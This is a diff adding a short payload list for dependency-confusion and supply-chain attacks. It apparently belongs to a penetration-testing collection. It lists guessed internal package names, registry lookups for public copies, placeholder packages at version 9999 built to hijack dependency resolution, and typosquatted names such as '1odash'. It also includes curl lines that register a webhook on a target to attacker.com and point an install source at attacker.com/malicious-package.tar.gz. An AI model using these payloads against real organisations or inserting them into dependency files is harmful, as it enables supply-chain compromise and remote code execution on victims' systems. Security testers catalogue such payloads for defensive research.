@@ -1,0 +1,30 @@
+internal-package
+@company/internal-lib
+companyname-internal
+internal-utils
+private-helpers
+company-config
+org-internal
+internal-api-client
+corp-shared
+company-shared-utils
+GET https://registry.npmjs.org/{internal-package-name}
+GET https://pypi.org/pypi/{internal-package-name}/json
+GET https://api.nuget.org/v3/registration5/{internal-package-name}/index.json
+GET https://registry.rubygems.org/api/v1/gems/{internal-package-name}.json
+{"name": "companyname-internal", "version": "9999.0.0", "main": "index.js"}
+setup.py with package name matching internal pip package at version 9999
+<PackageId>Company.Internal.Utils</PackageId><Version>9999.0.0</Version>
+curl -s https://registry.npmjs.org/{package_name} (check if internal package is on public registry)
+curl -s https://pypi.org/pypi/{package_name}/json (check if internal package is on PyPI)
+{"dependencies": {"internal-lib": "*"}} (wildcard version = confused into pulling public)
+GET https://github.com/{org}/{repo}/blob/main/package.json (look for internal package names in OSS repos)
+curl -s https://raw.githubusercontent.com/{org}/{repo}/main/requirements.txt
+curl -s https://raw.githubusercontent.com/{org}/{repo}/main/pom.xml
+curl -s https://raw.githubusercontent.com/{org}/{repo}/main/build.gradle
+npm install {typosquatted-popular-package} (lodash → 1odash, react → r3act)
+pip install {typosquatted-popular-package} (requests → request, flask → flaask)
+curl -s https://registry.npmjs.org/{package_name}/-/{package_name}-latest.tgz (check if malicious version exists)
+curl -s -X POST https://target.com/api/webhook -d '{"url":"https://attacker.com/hook","events":["*"]}' (supply chain via webhooks)
+curl -s https://target.com/api/integrations (enumerate third-party integrations)
+{"source": "https://attacker.com/malicious-package.tar.gz"} (custom install endpoint)
